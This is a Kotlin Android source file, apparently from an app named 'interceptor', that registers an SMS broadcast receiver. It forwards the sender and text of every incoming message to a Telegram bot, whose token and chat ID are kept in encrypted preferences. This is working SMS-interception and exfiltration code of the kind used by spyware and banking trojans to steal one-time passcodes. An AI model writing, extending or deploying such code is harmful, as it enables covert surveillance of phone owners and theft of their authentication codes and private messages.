package com.kucingsayabesar.interceptor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        val bundle: Bundle? = intent?.extras
        val pdus = bundle?.get("pdus") as? Array<*>
        pdus?.forEach {
            val format = bundle.getString("format")
            val sms = SmsMessage.createFromPdu(it as ByteArray, format)
            val sender = sms.displayOriginatingAddress
            val message = sms.displayMessageBody

            // Оборачиваем текст в спойлер (скрытый текст)
            val hiddenMessage = "📩 SMS от *$sender*:\n\n||${escapeMarkdown(message)}||"
            sendToTelegram(context, hiddenMessage)
        }
    }

    private fun sendToTelegram(context: Context?, text: String) {
        if (context == null) return

        val masterKey = MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()

        val prefs = EncryptedSharedPreferences.create(
            context,
            "secureBotSettings",
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )

        val botToken = prefs.getString("token", null)
        val chatId = prefs.getString("chat_id", null)
        if (botToken == null || chatId == null) return

        val urlString = "https://api.telegram.org/bot$botToken/sendMessage"

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json; utf-8")
                connection.doOutput = true

                val jsonPayload = JSONObject()
                jsonPayload.put("chat_id", chatId)
                jsonPayload.put("text", text)
                jsonPayload.put("parse_mode", "MarkdownV2") // включаем MarkdownV2 для спойлеров

                connection.outputStream.use { os ->
                    val input = jsonPayload.toString().toByteArray(Charsets.UTF_8)
                    os.write(input, 0, input.size)
                }

                connection.inputStream.close()
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("Interceptor", "Ошибка отправки в Telegram: ${e.message}")
            }
        }
    }

    // Telegram MarkdownV2 требует экранировать спецсимволы
    private fun escapeMarkdown(text: String): String {
        val reservedChars = "_*[]()~`>#+-=|{}.!"
        var result = text
        for (char in reservedChars) {
            result = result.replace(char.toString(), "\\$char")
        }
        return result
    }
}
